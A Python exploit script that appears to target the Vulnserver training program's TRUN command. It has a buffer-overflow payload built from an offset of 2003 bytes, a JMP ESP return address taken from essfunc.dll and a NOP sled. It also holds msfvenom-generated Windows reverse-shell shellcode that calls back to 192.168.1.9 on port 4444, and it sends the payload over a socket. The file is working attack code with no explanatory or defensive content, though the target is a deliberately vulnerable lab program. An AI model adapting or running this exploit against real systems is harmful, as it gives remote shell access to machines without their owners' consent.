import socket
import struct
import sys

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v shellcode -a x64 --platform windows -n 10 -o /tmp/shellcode.py && cat /tmp/shellcode.py && rm /tmp/shellcode.py

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode

# 2983 A's with spike

total_length = 2983
offset = 2003
# some options: `62501203`, `625011AF`, `625011BB`
new_eip = struct.pack("<I", 0x625011AF)  # JMP ESP essfunc.dll
nop_sled = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
shellcode = b""
shellcode += b"\xdb\xc4\xd9\x74\x24\xf4\xbe\x37\xce\x6b\xf7"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17"
shellcode += b"\x83\xf7\xca\x89\x02\x0b\x3a\xcf\xed\xf3\xbb"
shellcode += b"\xb0\x64\x16\x8a\xf0\x13\x53\xbd\xc0\x50\x31"
shellcode += b"\x32\xaa\x35\xa1\xc1\xde\x91\xc6\x62\x54\xc4"
shellcode += b"\xe9\x73\xc5\x34\x68\xf0\x14\x69\x4a\xc9\xd6"
shellcode += b"\x7c\x8b\x0e\x0a\x8c\xd9\xc7\x40\x23\xcd\x6c"
shellcode += b"\x1c\xf8\x66\x3e\xb0\x78\x9b\xf7\xb3\xa9\x0a"
shellcode += b"\x83\xed\x69\xad\x40\x86\x23\xb5\x85\xa3\xfa"
shellcode += b"\x4e\x7d\x5f\xfd\x86\x4f\xa0\x52\xe7\x7f\x53"
shellcode += b"\xaa\x20\x47\x8c\xd9\x58\xbb\x31\xda\x9f\xc1"
shellcode += b"\xed\x6f\x3b\x61\x65\xd7\xe7\x93\xaa\x8e\x6c"
shellcode += b"\x9f\x07\xc4\x2a\xbc\x96\x09\x41\xb8\x13\xac"
shellcode += b"\x85\x48\x67\x8b\x01\x10\x33\xb2\x10\xfc\x92"
shellcode += b"\xcb\x42\x5f\x4a\x6e\x09\x72\x9f\x03\x50\x1b"
shellcode += b"\x6c\x2e\x6a\xdb\xfa\x39\x19\xe9\xa5\x91\xb5"
shellcode += b"\x41\x2d\x3c\x42\xa5\x04\xf8\xdc\x58\xa7\xf9"
shellcode += b"\xf5\x9e\xf3\xa9\x6d\x36\x7c\x22\x6d\xb7\xa9"
shellcode += b"\xe5\x3d\x17\x02\x46\xed\xd7\xf2\x2e\xe7\xd7"
shellcode += b"\x2d\x4e\x08\x32\x46\xe5\xf3\xd5\xa9\x52\xfa"
shellcode += b"\x2c\x42\xa1\xfc\x3f\xce\x2c\x1a\x55\xfe\x78"
shellcode += b"\xb5\xc2\x67\x21\x4d\x72\x67\xff\x28\xb4\xe3"
shellcode += b"\x0c\xcd\x7b\x04\x78\xdd\xec\xe4\x37\xbf\xbb"
shellcode += b"\xfb\xed\xd7\x20\x69\x6a\x27\x2e\x92\x25\x70"
shellcode += b"\x67\x64\x3c\x14\x95\xdf\x96\x0a\x64\xb9\xd1"
shellcode += b"\x8e\xb3\x7a\xdf\x0f\x31\xc6\xfb\x1f\x8f\xc7"
shellcode += b"\x47\x4b\x5f\x9e\x11\x25\x19\x48\xd0\x9f\xf3"
shellcode += b"\x27\xba\x77\x85\x0b\x7d\x01\x8a\x41\x0b\xed"
shellcode += b"\x3b\x3c\x4a\x12\xf3\xa8\x5a\x6b\xe9\x48\xa4"
shellcode += b"\xa6\xa9\x69\x47\x62\xc4\x01\xde\xe7\x65\x4c"
shellcode += b"\xe1\xd2\xaa\x69\x62\xd6\x52\x8e\x7a\x93\x57"
shellcode += b"\xca\x3c\x48\x2a\x43\xa9\x6e\x99\x64\xf8"

payload = [
    b"TRUN /.:/",
    b"A" * offset,
    new_eip,
    nop_sled,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) -
            len(nop_sled) - len(shellcode)),
]

payload = b"".join(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))

try:
    s.send(payload)
    s.close()
except (socket.error):
    print("Error sending data")
    sys.exit()
